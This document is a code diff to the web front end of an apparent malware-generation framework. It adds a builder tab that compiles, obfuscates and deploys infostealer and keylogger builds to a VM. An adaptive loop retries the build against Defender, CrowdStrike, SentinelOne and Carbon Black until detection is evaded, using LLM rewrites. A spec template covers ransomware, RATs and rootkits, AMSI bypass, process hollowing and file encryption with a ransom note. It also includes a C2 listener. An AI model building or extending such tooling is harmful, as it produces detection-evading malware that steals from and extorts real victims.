@@ -39,6 +39,7 @@ body{background:var(--bg);color:var(--text);font-family:var(--sans);display:flex
   font-family:var(--mono);
 }
 .hdr-badge.running{border-color:var(--green);color:var(--green)}
+.hdr-badge.paused{border-color:var(--yellow);color:var(--yellow)}
 
 /* ── Layout ── */
 .layout{flex:1;display:flex;overflow:hidden}
@@ -130,6 +131,8 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
 .run-btn:disabled{background:var(--bg3);color:var(--muted);cursor:not-allowed}
 .run-btn.stop{background:var(--red);color:#fff}
 .run-btn.stop:hover{background:#ff6b63}
+.run-btn.paused{background:var(--yellow);color:#0d1117}
+.run-btn.paused:hover{background:#e5b329}
 
 /* ── Main panel ── */
 .main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
@@ -261,10 +264,12 @@ input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:po
       <button class="tab" data-cmd="ssh">ssh</button>
       <button class="tab" data-cmd="listener">c2</button>
       <button class="tab" data-cmd="spec">spec</button>
+      <button class="tab" data-cmd="chunk">chunk</button>
     </div>
     <div class="form-scroll" id="form-area"></div>
-    <div class="run-wrap">
-      <button class="run-btn" id="run-btn">&#9654;&#xFE0E;  Run</button>
+    <div class="run-wrap" style="display:flex;gap:6px">
+      <button class="run-btn" id="run-btn" style="flex:1">&#9654;&#xFE0E;  Run</button>
+      <button class="run-btn paused" id="pause-btn" style="width:70px;display:none">⏸  Pause</button>
     </div>
   </div>
 
@@ -494,11 +499,17 @@ const CMDS = {
       loadSpec();
     }
   },
+  chunk: {
+    label: 'chunk',
+    build: (sec) => { buildChunkForm(sec); }
+  },
 };
 
 // ── State ────────────────────────────────────────────────────────────────────
 let activeCmd = 'run';
 let activeJobId = null;
+let activeJobCmd = null;  // which tab started the running job
+let activeJobPaused = false;
 let activeWs = null;
 let resCollapsed = false;
 
@@ -507,6 +518,10 @@ let sshWs = null;
 let sshTerm = null;
 let sshFitAddon = null;
 let sshConnected = false;
+
+// Chunk state
+let chunkMode = 'recipe';
+let chunkLayersData = null;
 
 // ── Form rendering ────────────────────────────────────────────────────────────
 function renderForm(cmd) {
@@ -584,6 +599,23 @@ function pickLLM(url, btn) {
 function syncLLMBtns(url) {
   const presets = {'http://localhost:1234': 0, 'http://localhost:11234': 1};
   const inp = document.getElementById('f_llm_url');
+  if (!inp) return;
+  const btns = inp.closest('.field')?.querySelectorAll('.llm-btn') || [];
+  btns.forEach(b => b.classList.remove('sel'));
+  const idx = presets[url.trim()];
+  if (idx !== undefined) btns[idx]?.classList.add('sel');
+}
+
+function chunkPickLLM(url, btn) {
+  btn.closest('.llm-pair').querySelectorAll('.llm-btn').forEach(b => b.classList.remove('sel'));
+  btn.classList.add('sel');
+  const inp = document.getElementById('chunk-llm-url');
+  if (inp) inp.value = url;
+}
+
+function chunkSyncLLMBtns(url) {
+  const presets = {'http://localhost:1234': 0, 'http://localhost:11234': 1};
+  const inp = document.getElementById('chunk-llm-url');
   if (!inp) return;
   const btns = inp.closest('.field')?.querySelectorAll('.llm-btn') || [];
   btns.forEach(b => b.classList.remove('sel'));
@@ -739,26 +771,40 @@ document.getElementById('tabs').addEventListener('click', ev => {
   t.classList.add('active');
   activeCmd = t.dataset.cmd;
   renderForm(activeCmd);
-  document.getElementById('run-btn').style.display = '';
+  const btn = document.getElementById('run-btn');
+  const pauseBtn = document.getElementById('pause-btn');
+  btn.style.display = '';
+  pauseBtn.style.display = 'none';
   if (activeCmd === 'ssh') {
     setSshView(sshConnected || !!sshTerm);
-    setSshConnected(sshConnected);  // refresh button label
-    const btn = document.getElementById('run-btn');
-    if (!sshConnected) { btn.textContent = '⏎  Connect'; btn.classList.remove('stop'); }
+    setSshConnected(sshConnected);
+    if (!sshConnected) { btn.textContent = '⏎  Connect'; btn.classList.remove('stop','paused'); }
   } else if (activeCmd === 'listener') {
     setSshView(false);
     refreshC2Status();
     updateC2Button();
   } else if (activeCmd === 'spec') {
     setSshView(false);
-    const btn = document.getElementById('run-btn');
     btn.style.display = 'none';
+  } else if (activeCmd === 'chunk') {
+    setSshView(false);
+    btn.textContent = '▶︎  Build';
+    btn.classList.remove('stop','paused');
+    btn.disabled = false;
+    if (activeJobId && activeJobCmd === 'chunk') {
+      setRunning(true, activeJobPaused);
+    }
   } else {
     setSshView(false);
-    if (!document.getElementById('run-btn').classList.contains('stop')) {
-      document.getElementById('run-btn').textContent = '▶︎  Run';
+    // Show stop/pause only if THIS tab owns the running job
+    if (activeJobId && activeJobCmd === activeCmd) {
+      setRunning(true, activeJobPaused);
+    } else {
+      btn.textContent = '▶︎  Run';
+      btn.classList.remove('stop','paused');
+      btn.disabled = false;
     }
-    pickMode(getMode());  // re-apply cloud gray-out after form re-render
+    pickMode(getMode());
   }
 });
 
@@ -775,6 +821,16 @@ document.getElementById('run-btn').addEventListener('click', async () => {
   // Listener tab: start / stop C2
   if (activeCmd === 'listener') {
     await toggleC2Listener();
+    return;
+  }
+
+  // Chunk tab: build or stop
+  if (activeCmd === 'chunk') {
+    if (btn.classList.contains('stop') && activeJobId) {
+      await fetch(`/api/jobs/${activeJobId}/kill`, {method:'POST'});
+    } else {
+      await chunkBuild();
+    }
     return;
   }
 
@@ -819,9 +875,22 @@ document.getElementById('run-btn').addEventListener('click', async () => {
       method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d),
     });
     const {job_id, cmd_str} = await r.json();
+    activeJobCmd = activeCmd;
     openJob(job_id, cmd_str, true);
   } catch(e) {
     flashError(`Could not start job: ${e}`);
+  }
+});
+
+// ── Pause / Resume ───────────────────────────────────────────────────────────
+document.getElementById('pause-btn').addEventListener('click', async () => {
+  if (!activeJobId) return;
+  if (activeJobPaused) {
+    await fetch(`/api/jobs/${activeJobId}/resume`, {method:'POST'});
+    setRunning(true, false);
+  } else {
+    await fetch(`/api/jobs/${activeJobId}/pause`, {method:'POST'});
+    setRunning(true, true);
   }
 });
 
@@ -837,7 +906,7 @@ function openJob(jobId, cmdStr, fresh) {
   document.querySelectorAll('.job-chip').forEach(c => c.classList.remove('active'));
   document.getElementById(`chip-${jobId}`)?.classList.add('active');
 
-  setRunning(true);
+  setRunning(true, false);
   setBadge('running', true);
 
   const ws = new WebSocket(`ws://${location.host}/ws/${jobId}`);
@@ -885,8 +954,9 @@ async function loadJob(jobId) {
   }
 
   // Re-subscribe for a still-running job
-  setRunning(true);
-  setBadge('running', true);
+  activeJobCmd = job.command || null;
+  setRunning(true, job.paused);
+  setBadge(job.paused ? 'paused' : 'running', true);
   const ws = new WebSocket(`ws://${location.host}/ws/${jobId}`);
   activeWs = ws;
   ws.onmessage = ev => {
@@ -943,22 +1013,45 @@ function appendLog(line, cls) {
 }
 
 // ── UI state helpers ──────────────────────────────────────────────────────────
-function setRunning(on) {
+function setRunning(on, paused) {
   const btn = document.getElementById('run-btn');
+  const pauseBtn = document.getElementById('pause-btn');
+  activeJobPaused = !!paused;
   if (on) {
     btn.textContent = '⏹  Stop';
     btn.classList.add('stop');
+    btn.classList.remove('paused');
+    pauseBtn.style.display = '';
+    if (paused) {
+      pauseBtn.textContent = '▶︎  Resume';
+      pauseBtn.classList.remove('paused');
+      pauseBtn.style.background = 'var(--green)';
+      pauseBtn.style.color = '#0d1117';
+    } else {
+      pauseBtn.textContent = '⏸';
+      pauseBtn.classList.add('paused');
+      pauseBtn.style.background = '';
+      pauseBtn.style.color = '';
+    }
   } else {
-    btn.textContent = '▶︎  Run';
-    btn.classList.remove('stop');
+    btn.textContent = activeCmd === 'chunk' ? '▶︎  Build' : '▶︎  Run';
+    btn.classList.remove('stop','paused');
     btn.disabled = false;
+    pauseBtn.style.display = 'none';
+    activeJobCmd = null;
+    activeJobPaused = false;
   }
 }
 
 function setBadge(status, running) {
   const b = document.getElementById('status-badge');
-  b.textContent = running ? 'running' : status;
-  b.className = 'hdr-badge' + (running ? ' running' : '');
+  if (status === 'paused') {
+    b.textContent = 'paused';
+    b.className = 'hdr-badge paused';
+  } else {
+    b.textContent = running ? 'running' : status;
+    b.className = 'hdr-badge' + (running ? ' running' : '');
+  }
 }
 
 function flashError(msg) {
@@ -1010,13 +1103,50 @@ async function initJobs() {
     const r = await fetch('/api/jobs');
     const list = await r.json();
     list.reverse().forEach(j => addChip(j.id, j.status, j.cmd_str));
-    // Auto-attach to most recent running job if any
     const running = list.find(j => j.status === 'running');
-    if (running) loadJob(running.id);
+    if (running) {
+      activeJobCmd = running.command || null;
+      loadJob(running.id);
+    }
   } catch {}
 }
 
 // ── Spec editor ──────────────────────────────────────────────────────────────
+const SPEC_TEMPLATE = `# Target environment specification
+os_platform: windows              # windows | linux
+os_version: windows-11            # windows-11 | windows-10 | ubuntu-24.04
+
+# Malware configuration
+malware_type: ransomware          # ransomware | infostealer | keylogger | rat | backdoor | rootkit
+source_language: c                # c | go
+output_format: exe                # exe | dll | shellcode
+
+# C2 (for connection-back malware: infostealer, keylogger, rat)
+c2_address: "10.0.2.2"           # QEMU host IP
+c2_port: 9001
+
+# EDR products on the target VM
+edrs:
+  - defender                      # defender | wazuh | velociraptor | elastic | openedr | none
+
+# Build
+installed_compilers:
+  - mingw-w64                     # mingw-w64 | gcc | go
+admin_rights: true
+
+# Custom evasion requirements (optional)
+# custom_gates:
+#   - no console window
+#   - must bypass AMSI
+#   - process hollowing preferred
+
+# Behavioral specification (optional, overrides default behavior)
+# behavior: |
+#   Encrypt all .docx and .pdf files in user profile directories.
+#   Drop ransom note as README_DECRYPT.txt in each affected folder.
+#   Use AES-256-CBC with a randomly generated key.
+`;
+
 async function loadSpec() {
   const editor = document.getElementById('spec-editor');
   const status = document.getElementById('spec-status');
@@ -1027,8 +1157,8 @@ async function loadSpec() {
       const data = await res.json();
       editor.value = data.content;
     } else {
-      editor.value = '';
-      editor.placeholder = 'spec.yaml not found — type your spec here and save';
+      editor.value = SPEC_TEMPLATE;
+      if (status) { status.style.color = 'var(--yellow)'; status.textContent = 'Template loaded — edit and save'; }
     }
   } catch(e) {
     if (status) { status.style.color = 'var(--red)'; status.textContent = 'Load error: ' + e.message; }
@@ -1135,7 +1265,7 @@ async function toggleC2Listener() {
     });
     const s = await r.json();
     if (s.ok) {
-      appendLog(`[C2] Listener started on 0.0.0.0:${port} -- data saves to results/c2_received_*.bin`, 'ok');
+      appendLog(`[C2] Listener started on 0.0.0.0:${port} — waiting for callback`, 'ok');
     } else {
       appendLog(`[C2] Failed to start listener on port ${port}`, 'err');
     }
@@ -1154,6 +1284,364 @@ async function viewC2Data(filename) {
     flashError(`Could not load ${filename}: ${e}`);
   }
 }
+
+// ── Chunk Builder ────────────────────────────────────────────────────────────
+
+function buildChunkForm(area) {
+  area.innerHTML = `
+    <div class="sec">
+      <div class="sec-hdr">Malware Type</div>
+      <div class="field">
+        <select id="chunk-type">
+          <option value="infostealer">infostealer</option>
+          <option value="keylogger">keylogger</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="sec">
+      <div class="sec-hdr">VM Connection</div>
+      <div class="field">
+        <label for="chunk-vm-port">SSH Port</label>
+        <input id="chunk-vm-port" value="10022" style="font-family:var(--mono)">
+      </div>
+      <div class="field">
+        <label for="chunk-vm-user">Username</label>
+        <input id="chunk-vm-user" value="vmuser" style="font-family:var(--mono)">
+      </div>
+      <div class="field">
+        <label for="chunk-vm-pass">Password</label>
+        <input id="chunk-vm-pass" value="vmuser123" type="password" style="font-family:var(--mono)">
+      </div>
+      <div class="field">
+        <label for="chunk-c2-port">C2 Port</label>
+        <input id="chunk-c2-port" value="9001" style="font-family:var(--mono)">
+      </div>
+    </div>
+
+    <div class="sec">
+      <div class="sec-hdr">Build Options</div>
+      <label class="chk-row"><input type="checkbox" id="chunk-compile" checked> Compile after assembly</label>
+      <label class="chk-row"><input type="checkbox" id="chunk-deploy" checked> Deploy &amp; validate on VM</label>
+      <div class="field" style="margin-top:6px">
+        <label for="chunk-obfuscation">Code Obfuscation</label>
+        <select id="chunk-obfuscation">
+          <option value="none">None (raw output)</option>
+          <option value="light">Light (var rename + string encrypt)</option>
+          <option value="heavy" selected>Heavy (+ API obfuscation + anti-debug)</option>
+          <option value="max">Max (+ LLM rewrite)</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="sec">
+      <div class="sec-hdr">Adaptive Loop</div>
+      <label class="chk-row"><input type="checkbox" id="chunk-adaptive"> Enable adaptive loop</label>
+      <div id="chunk-adaptive-opts" style="display:none;margin-top:6px">
+        <p style="font-size:11px;color:var(--muted);margin-bottom:6px">
+          Deploys, checks if detected, auto-pulls detection message,
+          picks new evasion layers, rebuilds, repeats. Up to 10 attempts
+          (5 algorithmic, then escalates to LLM).
+        </p>
+        <div class="field">
+          <label for="chunk-av-type">Target AV/EDR</label>
+          <select id="chunk-av-type">
+            <option value="defender">Windows Defender</option>
+            <option value="crowdstrike">CrowdStrike Falcon</option>
+            <option value="sentinelone">SentinelOne</option>
+            <option value="carbon_black">Carbon Black</option>
+            <option value="custom">Custom (specify command)</option>
+          </select>
+        </div>
+        <div class="field" id="chunk-custom-cmd-wrap" style="display:none">
+          <label for="chunk-custom-cmd">Detection check command</label>
+          <input id="chunk-custom-cmd" placeholder="powershell -Command &quot;Get-MpThreatDetection&quot;" style="font-family:var(--mono);font-size:11px">
+        </div>
+        <div class="field">
+          <label for="chunk-max-runs">Max attempts</label>
+          <select id="chunk-max-runs">
+            <option value="5">5 (algorithmic only)</option>
+            <option value="8">8 (+ LLM escalation)</option>
+            <option value="10" selected>10 (+ cloud LLM)</option>
+          </select>
+        </div>
+      </div>
+    </div>
+
+    <div class="sec">
+      <div class="sec-hdr">Local LLM</div>
+      <p style="font-size:10px;color:var(--muted);margin-bottom:4px">Used by adaptive loop (Tier 2+) and "Max" obfuscation.</p>
+      <div class="field">
+        <label>Endpoint</label>
+        <div class="llm-pair">
+          <div class="llm-btn sel" onclick="chunkPickLLM('http://localhost:1234',this)">X&nbsp;local<br><span style="font-size:10px;font-weight:400">:1234</span></div>
+          <div class="llm-btn" onclick="chunkPickLLM('http://localhost:11234',this)">Z&nbsp;tunnel<br><span style="font-size:10px;font-weight:400">:11234</span></div>
+        </div>
+        <input type="text" id="chunk-llm-url" value="http://localhost:1234" placeholder="http://localhost:1234" style="font-family:var(--mono);font-size:11px" oninput="chunkSyncLLMBtns(this.value)">
+      </div>
+      <div class="field">
+        <label for="chunk-llm-model">Model name</label>
+        <input type="text" id="chunk-llm-model" placeholder="qwen3-35b-a3b… (blank = use loaded model)" style="font-family:var(--mono);font-size:11px">
+      </div>
+    </div>
+
+    <details style="margin:8px 0">
+      <summary style="font-size:11px;color:var(--muted);cursor:pointer">Advanced: layer overrides</summary>
+      <div class="sec" style="margin-top:6px">
+        <p style="font-size:10px;color:var(--muted);margin-bottom:4px">Override auto-selection. Leave as "auto" to let the framework decide.</p>
+        <div id="chunk-layers" style="font-size:11px">Loading...</div>
+      </div>
+    </details>
+
+    <div class="sec">
+      <div class="sec-hdr">Run History</div>
+      <div id="chunk-history" style="font-family:var(--mono);font-size:11px">No runs yet</div>
+    </div>
+  `;
+  chunkMode = 'recipe';
+  document.getElementById('chunk-adaptive')?.addEventListener('change', (e) => {
+    document.getElementById('chunk-adaptive-opts').style.display = e.target.checked ? '' : 'none';
+  });
+  document.getElementById('chunk-av-type')?.addEventListener('change', (e) => {
+    document.getElementById('chunk-custom-cmd-wrap').style.display = e.target.value === 'custom' ? '' : 'none';
+  });
+  // Load layers when the Advanced section is opened (not before)
+  const details = document.querySelector('details');
+  if (details) {
+    details.addEventListener('toggle', () => {
+      if (details.open && chunkLayersData) renderChunkLayers(chunkLayersData);
+    });
+  }
+  loadChunkLayers();
+  loadChunkHistory();
+  restoreChunkState();
+}
+
+const CHUNK_FIELDS = [
+  {id:'chunk-type', type:'val'},
+  {id:'chunk-vm-port', type:'val'},
+  {id:'chunk-vm-user', type:'val'},
+  {id:'chunk-vm-pass', type:'val'},
+  {id:'chunk-c2-port', type:'val'},
+  {id:'chunk-compile', type:'chk'},
+  {id:'chunk-deploy', type:'chk'},
+  {id:'chunk-obfuscation', type:'val'},
+  {id:'chunk-adaptive', type:'chk'},
+  {id:'chunk-av-type', type:'val'},
+  {id:'chunk-max-runs', type:'val'},
+  {id:'chunk-custom-cmd', type:'val'},
+  {id:'chunk-llm-url', type:'val'},
+  {id:'chunk-llm-model', type:'val'},
+];
+
+function saveChunkState() {
+  try {
+    const state = {};
+    CHUNK_FIELDS.forEach(f => {
+      const el = document.getElementById(f.id);
+      if (!el) return;
+      state[f.id] = f.type === 'chk' ? el.checked : el.value;
+    });
+    localStorage.setItem('mgf_state_chunk', JSON.stringify(state));
+  } catch(e) {}
+}
+
+function restoreChunkState() {
+  try {
+    const raw = localStorage.getItem('mgf_state_chunk');
+    if (!raw) return;
+    const state = JSON.parse(raw);
+    CHUNK_FIELDS.forEach(f => {
+      const el = document.getElementById(f.id);
+      if (!el || state[f.id] === undefined) return;
+      if (f.type === 'chk') el.checked = state[f.id];
+      else el.value = state[f.id];
+    });
+    // Sync derived UI state
+    const adaptiveOpts = document.getElementById('chunk-adaptive-opts');
+    if (adaptiveOpts) adaptiveOpts.style.display = state['chunk-adaptive'] ? '' : 'none';
+    const customWrap = document.getElementById('chunk-custom-cmd-wrap');
+    if (customWrap) customWrap.style.display = state['chunk-av-type'] === 'custom' ? '' : 'none';
+    if (state['chunk-llm-url']) chunkSyncLLMBtns(state['chunk-llm-url']);
+  } catch(e) {}
+}
+
+// chunkPickMode and loadChunkRecipes removed — framework auto-selects recipe from type
+
+async function loadChunkLayers() {
+  try {
+    const r = await fetch('/api/chunk/layers');
+    chunkLayersData = await r.json();
+    renderChunkLayers(chunkLayersData);
+  } catch(e) { console.error('Failed to load layers:', e); }
+}
+
+function renderChunkLayers(layers) {
+  const div = document.getElementById('chunk-layers');
+  if (!div) return;
+  div.innerHTML = '';
+  const riskLabel = {vlow:'very low', low:'low', medium:'med', high:'high'};
+  for (const [name, info] of Object.entries(layers)) {
+    const field = document.createElement('div');
+    field.className = 'field';
+    field.style.marginBottom = '4px';
+    const autoOpt = `<option value="auto" selected>auto</option>`;
+    const opts = Object.entries(info.options).map(([opt, oi]) =>
+      `<option value="${opt}">${opt} [${riskLabel[oi.risk] || oi.risk}]</option>`
+    ).join('');
+    field.innerHTML = `
+      <label for="chunk-layer-${name}" style="font-size:10px">${name}</label>
+      <select id="chunk-layer-${name}" style="font-size:10px">${autoOpt}${opts}</select>
+    `;
+    div.appendChild(field);
+  }
+}
+
+async function chunkAutoSelect() {
+  const detection = document.getElementById('chunk-detection')?.value || '';
+  if (!detection.trim()) {
+    flashError('Paste detection text first');
+    return;
+  }
+  try {
+    const r = await fetch('/api/chunk/auto-select', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({detection}),
+    });
+    const config = await r.json();
+    for (const [layer, option] of Object.entries(config)) {
+      const sel = document.getElementById(`chunk-layer-${layer}`);
+      if (sel) sel.value = option;
+    }
+    appendLog('[chunk] Layers auto-selected from detection feedback', 'ok');
+  } catch(e) {
+    flashError(`Auto-select failed: ${e}`);
+  }
+}
+
+function chunkGetLayers() {
+  if (!chunkLayersData) return {};
+  const config = {};
+  for (const name of Object.keys(chunkLayersData)) {
+    const sel = document.getElementById(`chunk-layer-${name}`);
+    if (sel) config[name] = sel.value;
+  }
+  return config;
+}
+
+async function chunkBuild() {
+  saveChunkState();
+  const compile = document.getElementById('chunk-compile')?.checked ?? true;
+  const malware_type = document.getElementById('chunk-type')?.value || 'infostealer';
+  const adaptive = document.getElementById('chunk-adaptive')?.checked ?? false;
+  const deploy = document.getElementById('chunk-deploy')?.checked ?? true;
+  const avType = document.getElementById('chunk-av-type')?.value || 'defender';
+  const maxRuns = parseInt(document.getElementById('chunk-max-runs')?.value || '10');
+  const customCmd = document.getElementById('chunk-custom-cmd')?.value || '';
+  const obfuscation = document.getElementById('chunk-obfuscation')?.value || 'heavy';
+  const llm_url = document.getElementById('chunk-llm-url')?.value || '';
+  const llm_model = document.getElementById('chunk-llm-model')?.value || '';
+  const vm_port = document.getElementById('chunk-vm-port')?.value || '10022';
+  const vm_user = document.getElementById('chunk-vm-user')?.value || 'vmuser';
+  const vm_pass = document.getElementById('chunk-vm-pass')?.value || 'vmuser123';
+  const c2_port = document.getElementById('chunk-c2-port')?.value || '9001';
+
+  // Auto-pick best recipe for the type
+  const recipeMap = {infostealer: 'infostealer_full', keylogger: 'keylogger'};
+  const recipe = recipeMap[malware_type] || 'infostealer_full';
+
+  // Check if any layers were manually overridden
+  const layers = chunkGetLayers();
+  const hasOverrides = Object.values(layers).some(v => v !== 'auto');
+
+  let body;
+  if (hasOverrides) {
+    const resolved = {};
+    for (const [k, v] of Object.entries(layers)) {
+      if (v !== 'auto') resolved[k] = v;
+    }
+    body = {mode: 'custom', layers: resolved, malware_type, compile, deploy, obfuscation, llm_url, llm_model, vm_port, vm_user, vm_pass, c2_port};
+  } else if (adaptive) {
+    try {
+      const r = await fetch('/api/chunk/hybrid', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({malware_type, dry_run: false, av_type: avType, max_runs: maxRuns, custom_cmd: customCmd, obfuscation, llm_url, llm_model}),
+      });
+      if (!r.ok) {
+        const txt = await r.text();
+        flashError(`Hybrid loop failed (${r.status}): ${txt.slice(0, 200)}`);
+        return;
+      }
+      const {job_id, cmd_str} = await r.json();
+      activeJobCmd = 'chunk';
+      openJob(job_id, cmd_str, true);
+    } catch(e) { flashError(`Hybrid loop failed: ${e}`); }
+    return;
+  } else {
+    body = {mode: 'recipe', recipe, compile, deploy, obfuscation, llm_url, llm_model, vm_port, vm_user, vm_pass, c2_port};
+  }
+
+  try {
+    const r = await fetch('/api/chunk/build', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(body),
+    });
+    if (!r.ok) {
+      const txt = await r.text();
+      if (r.status === 404) {
+        flashError('Build endpoint not found — restart the portal server to load updated routes');
+      } else {
+        flashError(`Build failed (${r.status}): ${txt.slice(0, 200)}`);
+      }
+      return;
+    }
+    const {job_id, cmd_str} = await r.json();
+    activeJobCmd = 'chunk';
+    openJob(job_id, cmd_str, true);
+  } catch(e) {
+    flashError(`Build failed: ${e}`);
+  }
+}
+
+// chunkHybridLoop removed — adaptive loop is now triggered via chunkBuild()
+
+async function loadChunkHistory() {
+  try {
+    const r = await fetch('/api/chunk/history');
+    const hist = await r.json();
+    const div = document.getElementById('chunk-history');
+    if (!div) return;
+    const runs = hist.runs || [];
+    const successes = (hist.successes || []).length;
+    const detections = (hist.detections || []).length;
+    if (!runs.length) {
+      div.innerHTML = '<span style="color:var(--muted)">No runs yet</span>';
+      return;
+    }
+    let h = `<div style="margin-bottom:6px;color:var(--muted)">${runs.length} runs | ${successes} success | ${detections} detected</div>`;
+    const recent = runs.slice(-5).reverse();
+    recent.forEach(run => {
+      const status = run.success ? '<span style="color:var(--green)">OK</span>' :
+                     run.detected ? '<span style="color:var(--red)">DET</span>' :
+                     '<span style="color:var(--yellow)">FAIL</span>';
+      h += `<div style="padding:2px 0;border-top:1px solid var(--border)">${status}`;
+      if (run.detection_text) {
+        const txt = run.detection_text.length > 50 ? run.detection_text.substring(0, 50) + '...' : run.detection_text;
+        h += ` <span style="color:var(--muted)">${txt}</span>`;
+      }
+      h += '</div>';
+    });
+    div.innerHTML = h;
+  } catch(e) {
+    const div = document.getElementById('chunk-history');
+    if (div) div.innerHTML = '<span style="color:var(--muted)">Could not load history</span>';
+  }
+}
+
+// Hybrid loop button removed — adaptive loop triggered via main Build button
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 function el(tag, cls, txt) {
